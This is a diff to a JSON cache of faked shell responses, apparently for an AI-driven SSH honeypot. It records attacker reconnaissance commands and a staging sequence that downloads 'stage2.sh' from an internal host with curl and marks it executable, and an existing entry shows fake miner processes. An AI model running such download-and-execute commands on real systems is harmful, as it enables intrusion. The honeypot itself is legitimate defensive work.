@@ -83,6 +83,12 @@
     "llmModel": null,
     "updatedAtUtc": null
   },
+  "cat /etc/issue": {
+    "response": "Debian GNU/Linux 6.0 \\n \\l",
+    "origin": "llm",
+    "llmModel": "openai/gpt-5.6-luna",
+    "updatedAtUtc": "2026-09-04T12:21:19.6228368+00:00"
+  },
   "cat /etc/os-release": {
     "response": "PRETTY_NAME=\u0022Debian GNU/Linux 6.0.10 (squeeze)\u0022\nNAME=\u0022Debian GNU/Linux\u0022\nVERSION_ID=\u00226.0.10\u0022\nVERSION=\u00226.0.10 (squeeze)\u0022\nID=debian",
     "origin": "seed",
@@ -136,6 +142,12 @@
     "origin": "llm",
     "llmModel": "openai/gpt-5.6-luna",
     "updatedAtUtc": "2026-08-06T22:12:15.162443+00:00"
+  },
+  "cat /proc/cpuinfo | grep model | head -n 1": {
+    "response": "model\t\t: 85",
+    "origin": "llm",
+    "llmModel": "openai/gpt-5.6-luna",
+    "updatedAtUtc": "2026-09-04T12:21:16.5012029+00:00"
   },
   "cat /proc/cpuinfo | grep processor | wc -l": {
     "response": "2",
@@ -245,6 +257,12 @@
     "llmModel": "openai/gpt-5.6-luna",
     "updatedAtUtc": "2026-09-04T07:51:57.5656109+00:00"
   },
+  "chmod \u002Bx /tmp/stage2.sh": {
+    "response": "chmod: cannot access \u0060/tmp/stage2.sh\u0027: No such file or directory",
+    "origin": "llm",
+    "llmModel": "openai/gpt-5.6-luna",
+    "updatedAtUtc": "2026-09-04T12:21:31.3271753+00:00"
+  },
   "chmod 755 /tmp/testfile": {
     "response": "",
     "origin": "seed",
@@ -286,6 +304,12 @@
     "origin": "llm",
     "llmModel": "nvidia/nemotron-3-super-120b-a12b:free",
     "updatedAtUtc": "2026-09-04T07:51:55.1109751+00:00"
+  },
+  "curl -s http://192.168.1.50/stage2.sh -o /tmp/stage2.sh": {
+    "response": "curl: (7) couldn\u0027t connect to host",
+    "origin": "llm",
+    "llmModel": "nvidia/nemotron-3-super-120b-a12b:free",
+    "updatedAtUtc": "2026-09-04T12:21:29.1606628+00:00"
   },
   "curl -s ipinfo.io/json": {
     "response": "{\u0022ip\u0022:\u0022203.0.113.42\u0022,\u0022city\u0022:\u0022Reykjavik\u0022,\u0022region\u0022:\u0022Capital Region\u0022,\u0022country\u0022:\u0022IS\u0022,\u0022loc\u0022:\u002264.1466,-21.9426\u0022,\u0022org\u0022:\u0022AS-NETWORK-TRANSIT\u0022,\u0022postal\u0022:\u0022101\u0022,\u0022timezone\u0022:\u0022Atlantic/Reykjavik\u0022,\u0022readme\u0022:\u0022https://ipinfo.io/missingauth\u0022}",
@@ -1973,6 +1997,12 @@
     "llmModel": "openai/gpt-5.6-luna",
     "updatedAtUtc": "2026-08-11T09:29:33.4139815+00:00"
   },
+  "ps aux | head -n 5": {
+    "response": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\r\nroot         1  0.0  0.1  10324   688 ?        Ss   Jan08   0:03 init [2]\r\nroot       412  0.0  0.2  52760  2148 ?        Ss   Jan08   0:12 /usr/sbin/sshd -D\r\nroot       587  0.0  0.3  68432  3260 ?        S    Jan08   0:08 /usr/sbin/cron\r\nroot       633  0.0  0.4  91240  4312 ?        Ssl  Jan08   1:42 /usr/sbin/rsyslogd -c4",
+    "origin": "llm",
+    "llmModel": "openai/gpt-5.6-luna",
+    "updatedAtUtc": "2026-09-04T12:21:23.2227047+00:00"
+  },
   "ps | grep \u0027[Mm]iner\u0027": {
     "response": "  1837 ?        S      12:41 /usr/bin/minerd --url=stratum\u002Btcp://pool.example.net:3333 --user=worker01 --pass=x\r\n  2714 ?        S      08:17 /tmp/.cache/cpuminer -o stratum\u002Btcp://pool.example.net:3333 -u worker01",
     "origin": "llm",
@@ -2368,6 +2398,12 @@
     "origin": "seed",
     "llmModel": null,
     "updatedAtUtc": null
+  },
+  "which wget curl gcc python": {
+    "response": "/usr/bin/wget\r\n/usr/bin/curl\r\n/usr/bin/gcc\r\n/usr/bin/python",
+    "origin": "llm",
+    "llmModel": "openai/gpt-5.6-luna",
+    "updatedAtUtc": "2026-09-04T12:21:25.2695785+00:00"
   },
   "who | wc -l": {
     "response": "2",
